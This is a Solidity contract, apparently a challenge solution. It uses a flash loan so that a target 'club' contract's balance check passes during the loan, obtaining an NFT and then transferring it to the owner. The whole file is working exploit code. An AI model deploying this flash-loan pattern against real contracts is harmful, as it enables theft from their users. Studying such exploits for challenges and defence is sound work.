// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IClub {
    function iDeclareBeingRich() external;
}

interface IPool {
    function flashloan(address borrower, uint256 amount) external;
}

contract getNFTbyFlashloan is Ownable {
    address public bankToken;
    address public pool;
    address public club;

    constructor(address _token, address _pool, address _club) {
        bankToken = _token;
        pool = _pool;
        club = _club;
    }

    function attack() external onlyOwner {
        IPool(pool).flashloan(address(this), 1000001e18);
    }

    function executeWithMoney(uint256 amount) external {
        IClub(club).iDeclareBeingRich();
        IERC20(bankToken).transfer(pool, amount);
    }

    function transferNFT(uint256 tokenId) external onlyOwner {
        IERC721(club).safeTransferFrom(address(this), msg.sender, tokenId);
    }
}